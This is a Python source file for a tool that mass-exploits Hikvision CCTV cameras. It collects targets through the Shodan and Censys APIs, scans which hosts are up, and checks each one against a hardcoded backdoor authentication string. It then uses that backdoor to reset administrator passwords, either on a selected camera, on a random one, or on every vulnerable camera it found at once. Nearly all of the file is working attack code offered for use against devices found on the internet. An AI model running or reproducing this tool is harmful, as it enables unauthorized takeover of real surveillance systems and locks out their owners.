# -*- coding: utf-8 -*-
import sys
import socket
from socket import error as socket_error
import os
import time
import shodan
import requests
import re
import subprocess
import random
import json
import censys
import censys.ipv4
from censys.base import CensysException
import webbrowser

global path
global host

path = os.path.abspath(os.path.dirname(sys.argv[0]))
userID = ""
userName = ""
newPass = ""
host = open(path + '/host.txt' , 'r').read().splitlines()
up_host = open(path + '/up_host.txt', 'r').read().splitlines()
vulnerable_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
BackdoorAuthArg = "auth=YWRtaW46MTEK"
def usage():
    print ("""               ____  ____   _   __                       __           _   _    
              |_   ||   _| (_) [  |  _                  [  |         (_) / |_  
                | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
                |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
               _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
              |____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
                                                 [__|                           """)
    print ("""              +------------------------------------------------------------+
              |     exploit all the vulnerable cctv from hikvision         |
              |------------------------------------------------------------|
              | Usage:                                                     |
              | 1. Gather host with shodan (api needed)                    |
              | 2. Gather host with censys.io (api needed)                 |
              | 3. scan for up host                                        |
              | 4. scan for vuln host                                      |
              | 5. mass exploit all vuln CCTV                              |
              | 6. select a CCTV'S ip to exploit                           |
              | 7. random exploit CCTV from the vuln list                  |
              | 8. install dependency                                      |
              +------------------------------------------------------------+""")
                                                                
def gather_host_shodan():
    api_shodan_key = open(path + "/api.txt","r").read()
    if api_shodan_key == "":
        print('no shodan api found, please insert a valid one')
        api_shodan_key_to_file = raw_input('\ntype here:')
        with open(path + "/api.txt", "wb") as api:
            api.write(api_shodan_key_to_file)
        api = shodan.Shodan(api_shodan_key)
    else:
        api = shodan.Shodan(api_shodan_key)
        try:
            query = raw_input("["+"*"+"]"+ " enter a valid shodan query:")
            response = api.search(query)
            with open(path +'/host.txt',"wb") as host:
                for service in response['matches']:
                    host.write(service['ip_str']+ ":" + str(service['port']))#host.write(service['port']
                    host.write("\n")
        except KeyboardInterrupt:
            print ("\n[---]exiting now[---]")

def gather_host_censys():
    censys_list = open(path+"/censys_api.txt","r").read().splitlines()
    if censys_list == []:
        print('no censys api found, please insert a valid one')
        api_censys_uid = raw_input('[****]'+'type here uid:')
        api_censys_scrt = raw_input('[****]'+'type here secret:')
        with open(path+ "/censys_api.txt","wb") as api:
            api.write(api_censys_uid + "\n" + api_censys_scrt)
    else:
        uid = censys_list[0]
        secret = censys_list[1]
        query = raw_input('[+]'+'enter a valid query:')
        try:
            for record in censys.ipv4.CensysIPv4(api_id=uid, api_secret=secret).search(query):
                ip = record['ip']
                port = record['protocols']
                port_raw = port[0]
                port = re.findall(r'\d+', port_raw)
                with open(path + '/host.txt',"a") as cen:
                    cen.write(ip +":" + str(port[0]))
                    cen.write("\n")
        except KeyboardInterrupt:
            pass
        except CensysException:
            pass
2
    



def mass_exploit():
    #   VERY DANGEROUS
    global target_host
    global port
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    a = 0
    while a < len(vulnerable_host):
        try:
            res = vulnerable_host[a]
            print res
            match1 = re.search(pattern_1, res)
            match2 = re.search(pattern_2, res)
            target_host = match1.group()
            port_raw = match2.group()
            port = port_raw[1:]
            newPass = "12345porcodio"
            userID = "1"
            userName = "admin"
            userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
            URLBase = "http://"+target_host+ ":" + str(port) + "/"
            URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
            x = requests.put(URLUpload, data=userXML).text
        except requests.exceptions.ConnectionError:
            pass
        a += 1
def select_host_exploit():
    global target_host
    global port
    global userID
    global userName
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    b = 0
    while b < len(vulnerable_host):
        res = vulnerable_host[b]
        print str(b) + ". " + vulnerable_host[b]
        print "\n"
        b += 1
    sel = raw_input('[+]'+"please select a number for a specific host to hack:")
    res = vulnerable_host[int(sel)]
    match1 = re.search(pattern_1 , res)
    match2 = re.search(pattern_2 , res)
    target_host = match1.group()
    port_raw = match2.group()
    port = port_raw[1:]
    URLBase = "http://"+target_host+ ":" +str(port) + "/"
    print"[-]Password must start with 4 numbers, im setting it up for u."
    rawPass = raw_input('[*]'+'please choose a new password:')
    newPass = str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + rawPass
    ans_1 = raw_input("[*]Do you wanna scan for existing user and id? (y/n):")
    if ans_1 == "y":
        lista = requests.get(URLBase + "Security/users?1"+ BackdoorAuthArg).text
        idf = "<id>"
        pattern_id = r'(<id>).*'
        find_id = re.findall('<id>(.*?)</id>', lista,re.DOTALL)
        find_user = re.findall('<userName>(.+?)</userName>', lista, re.DOTALL)
        counter = 0
        while counter < len(find_id):
            print('[*]'+"Found user "+ find_user[counter] + " with id:" + find_id[counter])
            counter += 1
        select_user = input("[--]Select one user to change the password:")
        select_user = select_user - 1
        userID = find_id[select_user]
        userName = find_user[select_user]
    elif ans_1 == "n":
        userID = "1"
        userName = "admin"
    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
    URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
    a = requests.put(URLUpload, data=userXML)
    if a.status_code == 200:
        print('\n[ok]Changed password of ' + userName + ' to ' + newPass + ' at ' +res+ "\n")
    elif a.status_code != 200:
        print('[*]'+"Something went wrong!")

def random_host_exploit():
    global target_host
    global port
    global userID
    global userName
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    b = 0
    while b < len(host):
        res = host[b]
        print str(b) + ". " + host[b]
        print "\n"
        b += 1
    op = len(host) - 1
    sel = random.randint(1,op)
    print"[--]Selected No. " + str(sel)
    res = host[int(sel)]
    match1 = re.search(pattern_1 , res)
    match2 = re.search(pattern_2 , res)
    target_host = match1.group()
    port_raw = match2.group()
    port = port_raw[1:]
    URLBase = "http://"+target_host+ ":" +str(port) + "/"
    print"[-]Password must start with 4 numbers, im setting it up for u."
    rawPass = raw_input('[*]'+'please choose a new password:')
    newPass = str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + rawPass
    ans_1 = raw_input("[*]Do you wanna scan for existing user and id? (y/n):")
    if ans_1 == "y":
        lista = requests.get(URLBase + "Security/users?1"+ BackdoorAuthArg).text
        idf = "<id>"
        pattern_id = r'(<id>).*'
        find_id = re.findall('<id>(.*?)</id>', lista,re.DOTALL)
        find_user = re.findall('<userName>(.+?)</userName>', lista, re.DOTALL)
        counter = 0
        while counter < len(find_id):
            print('[*]'+"Found user "+ find_user[counter] + " with id:" + find_id[counter])
            counter += 1
        select_user = input("[--]Select one user to change the password:")
        select_user = select_user - 1
        userID = find_id[select_user]
        userName = find_user[select_user]
    elif ans_1 == "n":
        userID = "1"
        userName = "admin"
    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
    URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
    a = requests.put(URLUpload, data=userXML)
    if a.status_code == 200:
        print('\n[ok]Changed password of ' +userName+ ' to ' + newPass + ' at ' +res+ "\n")
    elif a.status_code != 200:
        print('[*]'+"Something went wrong!")
        print a

def up_scan():
    print"[+]Loading all host..."
    a = 0
    try:
        while a < len(host):
            global target_host
            global port
            pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
            pattern_2 = r'(\:).*'
            res = host[a]
            match1 = re.search(pattern_1 , res)
            match2 = re.search(pattern_2 , res)
            target_host = match1.group()
            port_raw = match2.group()
            port = port_raw[1:]
            try:
                client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                client.settimeout(5)
                client.connect((target_host,int(port)))
                client.send("GET /HTTP/1.1\r\nHost: google.com\r\n\r\n")
                response = client.recv(4096)
                x = True
            except socket_error:
                x = False
            except KeyboardInterrupt:
                print ("\n[---]exiting now[---]")
            if x == True:
                with open(path + '/up_host.txt',"a") as host_up:
                    host_up.write(target_host + ":" + port + "\n")
            elif x == False:
                pass
            
            a += 1
    except KeyboardInterrupt:
        print ("\n[---]exiting now[---]")
def vuln_scan_exp():
    p = 0
    while p < len(up_host):
        ip_to_check = up_host[p]
        try:
            sys.stdout.write("\r"+ "[##]Checking "+ ip_to_check)
            sys.stdout.flush()
            response = requests.get('http://'+ip_to_check+'/security/users/1?'+ BackdoorAuthArg)
            if response.status_code == 200:
                with open(path + '/vuln_host.txt' , 'a') as host_vuln:
                    host_vuln.write(ip_to_check + "\n")
            elif response.status_code ==401:
                pass
            elif response.status_code ==404:
                pass
            p += 1
        except requests.exceptions.ConnectionError:
            pass
            p += 1
    
            
        
    
def scan():
    up_scan()
    #vuln_scan_exp()

def install_dependence():
    install = raw_input('[*]Would you like to install the dependency? (y/n)')
    if install == "y":
        os.system('pip install shodan')
        os.system('pip install censys')
        usage()
        response()
    elif install == "n":
        usage()
        response()

    
    
    
def response():
    global usage
    usage_str = raw_input('\n[#]Select an option:')
    if str(usage_str) == "1":
        gather_host_shodan()
        response()
    elif str(usage_str) == "2":
        gather_host_censys()
        response()
    elif str(usage_str) == "3":
        scan()
        response()
    elif str(usage_str) =="4":
        vuln_scan_exp()
        response()
    elif str(usage_str) == "5":
        print('[!!!]Very dangerous option please be carefull')
        answer = raw_input('[???]do you wanna continue? [y/n]')
        if str(answer) == "y":
            mass_exploit()
            response()
        elif str(answer) == "n":
            response()
    elif str(usage_str) == "6":
        select_host_exploit()
        response()
    elif str(usage_str) == "7":
        random_host_exploit()
        response()
    elif str(usage_str) =="8":
        install_dependence()
    elif str(usage_str) == "help":
        main()






def main():
    try:
        usage()
        response()
    except KeyboardInterrupt:
        print ("\n[---]exiting now[---]")
main()




